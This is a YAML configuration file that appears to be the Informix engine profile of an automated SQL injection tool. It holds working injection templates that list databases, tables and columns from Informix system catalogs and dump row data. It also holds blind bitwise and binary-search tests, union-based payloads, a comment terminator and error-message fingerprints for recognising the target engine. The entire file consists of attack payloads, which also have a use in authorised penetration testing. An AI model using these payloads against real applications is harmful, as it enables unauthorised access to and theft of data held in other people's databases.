engine: Informix

resource:
 info: |
  select trim(
      dbinfo('version','full')
      || '${enclose_value_sql}'
      || dbservername
      || '${enclose_value_sql}'
      || user
      || '${trail_sql}'
  ) r
  from table(set{1})

 schema:
  database: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(t.name)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from sysmaster:informix.sysdatabases t
       where ${limit} = (select count(*) from sysmaster:informix.sysdatabases t1 where t.name >= t1.name)
       union all
       select '' as rr
       where 0 = (
           select count(*)
           from sysmaster:informix.sysdatabases t
           where ${limit} = (select count(*) from sysmaster:informix.sysdatabases t1 where t.name >= t1.name)
       )
   ) a

  table: |
   select
       rr
       ||'${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(t.tabname)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from ${database}:informix.systables t
       where ${limit} = (select count(*) from ${database}:informix.systables t1 where t.tabname >= t1.tabname)
       union all
       select '' as rr
       where 0 = (
           select count(*)
           from ${database}:informix.systables t
           where ${limit} = (select count(*) from ${database}:informix.systables t1 where t.tabname >= t1.tabname)
       )
   ) a

  column: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(c.colname)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}'
       and ${limit} = (select count(*) from ${database}:informix.syscolumns c1 join ${database}:informix.systables t1 on c1.tabid = t1.tabid where tabname = '${table}' and c.colname >= c1.colname)
       union all
       select '' as rr
       where 0 = (
           select count(*)
           from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}'
           and ${limit} = (select count(*) from ${database}:informix.syscolumns c1 join ${database}:informix.systables t1 on c1.tabid = t1.tabid where tabname = '${table}' and c.colname >= c1.colname)
       )
   ) a

  row:
   query: |
    select
        rr
        || '${trail_sql}'
        r
    from (
        select
            '${enclose_value_sql}'
            || trim(${fields})
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from ${database}:${table} t
        where ${limit} = (select count(*) from ${database}:${table})
        union all
        select '' as rr
        where 0 = (
           select count(*)
           from ${database}:${table}
           where ${limit} = (select count(*) from ${database}:${table})
        )
    ) a
   fields:
    field: trim(nvl(${field.value}, ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substr(
           r,
           ${window.char},
           32767
       ) r
   from (
       ${injection}
   ) x
  limit: ${limit.value}
  failsafe: |
   select
       (1337${indice}7330%2b1)
       || '' r
   from table(set{1})
  calibrator: rpad('${calibrator_sql}', 1024, '${calibrator_sql}')
  limitBoundary: 1
  endingComment: --+-
  fingerprint:
   errorMessage:
    - Found a quote for which there is no matching quote\. \[SQL State=
    - "\\[Informix\\]\\[Informix ODBC Driver\\]General error\\. \\(SQLPrepare\\["
    - Informix database
   # 'where matches' to avoid collision with cubrid
   engineSpecific: 1=case when ${test} then 1 else (select 2 from table(set{1}) where '' matches '') end

 binary:
  test:
   bit: |
    0 != bitand(
        ascii(substr(
            (${injection}),
            ${window.char},
            1
        )),
        ${bit}
    )
   bin: |
    substr(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchr(${mid.int})
   truthyBin:
    - chr(97)%3E%3Dchr(97)
    - chr(97)%3E%3Dchr(65)
    - chr(97)%3E%3Dchr(48)
    - chr(98)%3E%3Dchr(97)
    - chr(98)%3E%3Dchr(66)
    - chr(49)%3E%3Dchr(48)
   falsyBin:
    - chr(97)%3E%3Dchr(98)
    - chr(65)%3E%3Dchr(97)
    - chr(66)%3E%3Dchr(98)
    - chr(66)%3E%3Dchr(97)
    - chr(48)%3E%3Dchr(65)
    - chr(48)%3E%3Dchr(49)
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}

 union:
  indices: union select ${result_range} from (${indice_unique}) b
  capacity: "'${lead}${indice}' || ${calibrator}"
  orderBy: order by 1337